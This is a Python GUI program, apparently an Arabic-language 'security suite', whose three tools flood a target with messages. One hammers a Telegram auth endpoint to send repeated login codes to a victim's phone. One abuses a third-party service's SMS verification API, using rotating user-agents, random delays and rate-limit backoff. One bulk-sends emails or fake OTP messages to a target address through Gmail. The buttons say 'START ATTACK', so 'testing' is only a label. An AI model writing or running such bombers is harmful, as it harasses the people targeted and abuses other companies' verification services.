import customtkinter as ctk
import requests
import threading
import time
import json
import random
import smtplib
import math
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from PIL import Image  # تأكد من تثبيت pillow إذا كنت ستستخدم صوراً، حالياً الكود يعمل بدونه

# --- إعدادات الواجهة العامة (Theme) ---
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

# --- قائمة User-Agents لأداة SMS ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# =============================================================================
# 1. أداة Telegram (Spam Tool) - نافذة فرعية
# =============================================================================
class TelegramTool(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("AboElfadl - Telegram Request Tool")
        self.geometry("600x500")
        self.resizable(False, False)
        
        # جعل النافذة تظهر في المقدمة
        self.attributes('-topmost', True) 
        self.after(100, lambda: self.attributes('-topmost', False))

        self.is_running = False

        self.label_title = ctk.CTkLabel(self, text="Telegram Auth Sender", font=("Roboto Medium", 24))
        self.label_title.pack(pady=20)

        self.input_frame = ctk.CTkFrame(self)
        self.input_frame.pack(pady=10, padx=20, fill="x")

        self.entry_phone = ctk.CTkEntry(self.input_frame, placeholder_text="Phone (e.g., 96477000000)", height=40)
        self.entry_phone.pack(pady=10, padx=10, fill="x")

        self.entry_count = ctk.CTkEntry(self.input_frame, placeholder_text="Count (Loop)", height=40)
        self.entry_count.pack(pady=10, padx=10, fill="x")

        self.btn_start = ctk.CTkButton(self, text="START ATTACK 🚀", command=self.start_thread, height=50, fg_color="#c0392b", hover_color="#e74c3c", font=("Arial", 16, "bold"))
        self.btn_start.pack(pady=20, padx=40, fill="x")

        self.textbox_log = ctk.CTkTextbox(self, height=150, font=("Consolas", 12))
        self.textbox_log.pack(pady=10, padx=20, fill="both", expand=True)
        self.textbox_log.insert("0.0", ">> بانتظار البدء...\n")

    def log(self, message):
        self.textbox_log.insert("end", f"{message}\n")
        self.textbox_log.see("end")

    def start_thread(self):
        if not self.is_running:
            threading.Thread(target=self.run_process, daemon=True).start()

    def run_process(self):
        phone = self.entry_phone.get().strip()
        count_str = self.entry_count.get().strip()

        if not phone or not count_str.isdigit():
            self.log("❌ خطأ: يرجى إدخال رقم هاتف وعدد صحيح.")
            return

        count = int(count_str)
        if count > 100:
            count = 100
            self.log("⚠️ تنبيه: تم تحديد الحد الأقصى بـ 100.")

        self.is_running = True
        self.btn_start.configure(state="disabled", text="جاري العمل...")
        self.log(f"🎯 الهدف: {phone} | التكرار: {count}")
        
        headers = {'bot_id': '1288099309', 'origin': 'https://t.me', 'lang': 'en'}
        data = {'phone': phone}

        success, failed = 0, 0
        for i in range(count):
            try:
                response = requests.post('https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en', headers=headers, data=data, timeout=5)
                if response.status_code == 200 and response.text == "true":
                    success += 1
                    self.log(f"✅ [{i+1}/{count}] تم الإرسال.")
                else:
                    failed += 1
                    self.log(f"❌ [{i+1}/{count}] فشل ({response.status_code})")
            except Exception as e:
                failed += 1
                self.log(f"⚠️ خطأ: {e}")
            time.sleep(0.5)

        self.log(f"✅ انتهى. نجاح: {success} | فشل: {failed}")
        self.is_running = False
        self.btn_start.configure(state="normal", text="START ATTACK 🚀")


# =============================================================================
# 2. أداة SMS (Speed Mode) - نافذة فرعية
# =============================================================================
class SMSTool(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("AboElfadl - SMS Security Tool")
        self.geometry("600x650")
        
        self.attributes('-topmost', True)
        self.after(100, lambda: self.attributes('-topmost', False))

        self.label = ctk.CTkLabel(self, text="نظام اختبار SMS (Speed Mode)", font=("Sakkal Majalla", 26, "bold"))
        self.label.pack(pady=15)

        self.input_frame = ctk.CTkFrame(self)
        self.input_frame.pack(pady=10, padx=20, fill="x")

        self.phone_entry = ctk.CTkEntry(self.input_frame, placeholder_text="رقم الهاتف (بدون مفتاح الدولة)", height=40)
        self.phone_entry.pack(pady=10, padx=10, fill="x")

        self.count_entry = ctk.CTkEntry(self.input_frame, placeholder_text="عدد الرسائل", height=40)
        self.count_entry.pack(pady=10, padx=10, fill="x")

        self.settings_frame = ctk.CTkFrame(self)
        self.settings_frame.pack(pady=10, padx=20, fill="x")
        
        self.lbl_settings = ctk.CTkLabel(self.settings_frame, text="⚙️ إعدادات السرعة", font=("Arial", 14))
        self.lbl_settings.pack(pady=5)

        self.delay_label = ctk.CTkLabel(self.settings_frame, text="تأخير عشوائي (ثواني): 5 - 10")
        self.delay_label.pack(pady=2)
        
        self.delay_slider = ctk.CTkSlider(self.settings_frame, from_=2, to=30, number_of_steps=28, command=self.update_slider_text)
        self.delay_slider.set(8)
        self.delay_slider.pack(pady=10, padx=20, fill="x")

        self.log_box = ctk.CTkTextbox(self, width=500, height=200, font=("Consolas", 12))
        self.log_box.pack(pady=10, padx=20, fill="both", expand=True)

        self.btn_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.btn_frame.pack(pady=20)

        self.start_button = ctk.CTkButton(self.btn_frame, text="🚀 بدء الهجوم", command=self.start_thread, fg_color="#c0392b", hover_color="#e74c3c", width=150)
        self.start_button.pack(side="left", padx=10)

        self.stop_button = ctk.CTkButton(self.btn_frame, text="🛑 إيقاف", command=self.stop_process, fg_color="#7f8c8d", hover_color="#95a5a6", width=150)
        self.stop_button.pack(side="left", padx=10)

        self.running = False

    def update_slider_text(self, value):
        self.delay_label.configure(text=f"تأخير عشوائي (ثواني): {int(value/2)} - {int(value)}")

    def log(self, message):
        self.log_box.insert("end", message + "\n")
        self.log_box.see("end")

    def start_thread(self):
        if not self.running:
            self.running = True
            self.start_button.configure(state="disabled", text="جاري العمل...")
            threading.Thread(target=self.process_attack, daemon=True).start()

    def stop_process(self):
        self.running = False
        self.log("⚠️ تم طلب إيقاف النظام...")
        self.start_button.configure(state="normal", text="🚀 بدء الهجوم")

    def process_attack(self):
        number = self.phone_entry.get()
        count_str = self.count_entry.get()
        if not number or not count_str:
            self.log("❌ خطأ: البيانات ناقصة.")
            self.stop_process()
            return

        url = "https://api.twistmena.com/music/Dlogin/sendCode" 
        payload = json.dumps({"dial": f"2{number}"})
        max_delay = self.delay_slider.get()
        min_delay = max_delay / 2
        COOLDOWN_TIME = 25 

        for i in range(int(count_str)):
            if not self.running: break
            headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': "application/json", 'platform': "android"}
            try:
                self.log(f"⏳ [محاولة {i+1}] جاري الإرسال...")
                response = requests.post(url, data=payload, headers=headers, timeout=10)
                if response.status_code == 200:
                    self.log(f"✅ نجاح.")
                elif response.status_code == 429:
                    self.log(f"⚠️ ضغط عالي (429): استراحة {COOLDOWN_TIME} ثانية...")
                    time.sleep(COOLDOWN_TIME)
                    continue
                else:
                    self.log(f"❌ فشل: {response.status_code}")
            except Exception as e:
                self.log(f"✖ خطأ: {e}")
            
            time.sleep(random.uniform(min_delay, max_delay))

        self.log("🏁 انتهت المهمة.")
        self.stop_process()


# =============================================================================
# 3. أداة البريد الإلكتروني (Email Sender) - نافذة فرعية
# =============================================================================
class EmailTool(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("AboElfadl - Email Sender Tool")
        self.geometry("700x600")

        self.attributes('-topmost', True)
        self.after(100, lambda: self.attributes('-topmost', False))

        self.header = ctk.CTkLabel(self, text="نظام اختبار البريد الإلكتروني (Email Stress)", font=("Arial", 20, "bold"))
        self.header.pack(pady=10)

        self.frame_config = ctk.CTkFrame(self)
        self.frame_config.pack(pady=5, padx=20, fill="x")

        self.lbl_config = ctk.CTkLabel(self.frame_config, text="Gmail Config (App Password)", font=("Arial", 12))
        self.lbl_config.pack(pady=5)

        self.sender_email = ctk.CTkEntry(self.frame_config, placeholder_text="Your Email", width=300)
        self.sender_email.pack(pady=5)
        self.sender_email.insert(0, "بريدك الإلكتروني ") 

        self.sender_pass = ctk.CTkEntry(self.frame_config, placeholder_text="App Password", width=300, show="*")
        self.sender_pass.pack(pady=5)
        self.sender_pass.insert(0, "كلمة مرور التطبيق (App Password)")

        self.frame_target = ctk.CTkFrame(self)
        self.frame_target.pack(pady=10, padx=20, fill="x")

        self.target_email = ctk.CTkEntry(self.frame_target, placeholder_text="Target Email", width=400)
        self.target_email.pack(pady=5)

        self.message_body = ctk.CTkEntry(self.frame_target, placeholder_text="Message Body", width=400)
        self.message_body.pack(pady=5)

        self.otp_var = ctk.BooleanVar(value=False)
        self.otp_switch = ctk.CTkSwitch(self.frame_target, text="تفعيل وضع OTP Mode", variable=self.otp_var)
        self.otp_switch.pack(pady=5)

        self.count_entry = ctk.CTkEntry(self.frame_target, placeholder_text="Count", width=150)
        self.count_entry.pack(pady=5)

        self.btn_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.btn_frame.pack(pady=5)

        self.start_btn = ctk.CTkButton(self.btn_frame, text="🚀 بدء الإرسال", command=self.start_thread, fg_color="green", hover_color="darkgreen")
        self.start_btn.pack(side="left", padx=10)

        self.stop_btn = ctk.CTkButton(self.btn_frame, text="🛑 إيقاف", command=self.stop_process, fg_color="red", hover_color="darkred", state="disabled")
        self.stop_btn.pack(side="left", padx=10)

        self.log_box = ctk.CTkTextbox(self, width=600, height=200, font=("Consolas", 12))
        self.log_box.pack(pady=10, padx=20, fill="both", expand=True)

        self.running = False

    def log(self, text):
        self.log_box.insert("end", text + "\n")
        self.log_box.see("end")

    def generateOTP(self):
        digits = "0123456789"
        OTP = ""
        for i in range(6):
            OTP += digits[math.floor(random.random() * 10)]
        return OTP

    def start_thread(self):
        if not self.running:
            self.running = True
            self.start_btn.configure(state="disabled")
            self.stop_btn.configure(state="normal")
            threading.Thread(target=self.process_sending, daemon=True).start()

    def stop_process(self):
        self.running = False
        self.log("⚠️ تم طلب إيقاف العملية...")

    def process_sending(self):
        sender = self.sender_email.get()
        password = self.sender_pass.get()
        receiver = self.target_email.get()
        count_str = self.count_entry.get()
        msg_text = self.message_body.get()
        is_otp = self.otp_var.get()

        if not sender or not password or not receiver or not count_str:
            self.log("❌ خطأ: الحقول ناقصة.")
            self.reset_buttons()
            return

        try:
            count = int(count_str)
        except ValueError:
            self.reset_buttons()
            return

        self.log(f"✅ بدء إرسال {count} رسالة...")
        success, fail = 0, 0

        for i in range(count):
            if not self.running: break
            
            if is_otp:
                otp_code = self.generateOTP()
                subject = "Verification Code"
                body = f"Your OTP Code is: {otp_code}"
            else:
                subject = "New Message"
                body = msg_text if msg_text else "Test Message"

            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain', 'utf-8'))

            try:
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(sender, password.replace(" ", ""))
                server.sendmail(sender, receiver, msg.as_string())
                server.quit()
                self.log(f"📤 ({i+1}/{count}) تم.")
                success += 1
            except Exception as e:
                self.log(f"❌ خطأ: {e}")
                fail += 1
            time.sleep(1.5)

        self.log(f"🏁 انتهى. نجاح: {success} | فشل: {fail}")
        self.reset_buttons()

    def reset_buttons(self):
        self.running = False
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")


# =============================================================================
# 4. التطبيق الرئيسي (Dashboard)
# =============================================================================
class MainDashboard(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        self.title("AboElfadl - Security Suite")
        self.geometry("500x500")
        self.resizable(False, False)

        # عنوان الترحيب
        self.lbl_welcome = ctk.CTkLabel(self, text="مرحباً بك يا محمود", font=("Arial", 16))
        self.lbl_welcome.pack(pady=(20, 5))

        self.lbl_brand = ctk.CTkLabel(self, text="AboElfadl Security Suite", font=("Impact", 28), text_color="#3498db")
        self.lbl_brand.pack(pady=5)
        
        self.lbl_desc = ctk.CTkLabel(self, text="أدوات اختبار وتوعية أمنية متكاملة", font=("Arial", 12, "italic"), text_color="gray")
        self.lbl_desc.pack(pady=(0, 30))

        # حاوية الأزرار
        self.frame_menu = ctk.CTkFrame(self)
        self.frame_menu.pack(pady=10, padx=40, fill="both", expand=True)

        # زر أداة Telegram
        self.btn_telegram = ctk.CTkButton(self.frame_menu, text="🔵 Telegram Auth Tool", 
                                          command=self.open_telegram, 
                                          height=50, 
                                          font=("Arial", 14, "bold"),
                                          fg_color="#2980b9", hover_color="#3498db")
        self.btn_telegram.pack(pady=15, padx=20, fill="x")

        # زر أداة SMS
        self.btn_sms = ctk.CTkButton(self.frame_menu, text="🟢 SMS Speed Test", 
                                     command=self.open_sms, 
                                     height=50, 
                                     font=("Arial", 14, "bold"),
                                     fg_color="#27ae60", hover_color="#2ecc71")
        self.btn_sms.pack(pady=15, padx=20, fill="x")

        # زر أداة Email
        self.btn_email = ctk.CTkButton(self.frame_menu, text="🔴 Email Stress Test", 
                                       command=self.open_email, 
                                       height=50, 
                                       font=("Arial", 14, "bold"),
                                       fg_color="#c0392b", hover_color="#e74c3c")
        self.btn_email.pack(pady=15, padx=20, fill="x")

        # تذييل
        self.lbl_footer = ctk.CTkLabel(self, text="Developed by: Mahmoud AboElfadl © 2025", text_color="gray", font=("Arial", 10))
        self.lbl_footer.pack(pady=10)

    # دوال فتح النوافذ
    def open_telegram(self):
        TelegramTool(self)

    def open_sms(self):
        SMSTool(self)

    def open_email(self):
        EmailTool(self)

if __name__ == "__main__":
    app = MainDashboard()
    app.mainloop()